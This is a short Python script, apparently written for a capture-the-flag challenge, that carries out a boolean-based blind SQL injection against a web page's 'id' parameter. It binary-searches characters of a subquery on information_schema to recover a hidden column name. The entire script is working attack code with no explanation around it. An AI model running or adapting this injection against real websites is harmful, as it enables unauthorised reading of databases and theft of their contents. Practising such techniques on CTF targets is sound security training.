#!/usr/bin/env python3
import urllib.request
BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"
def oracle(cond):
    url = f"{BASE}?id=2-({cond})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8','ignore')
        return 'NO! Not this!' in resp
    except:
        return False

sq = "(select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp('Flaaaaag'))"
# length = 11
result = ""
for pos in range(1, 12):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"ord(substr({sq},{pos},1))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    c = chr(lo)
    result += c
    print(f"[{pos}/11] '{c}' => {result}")
print(f"\nColumn name: {result}")
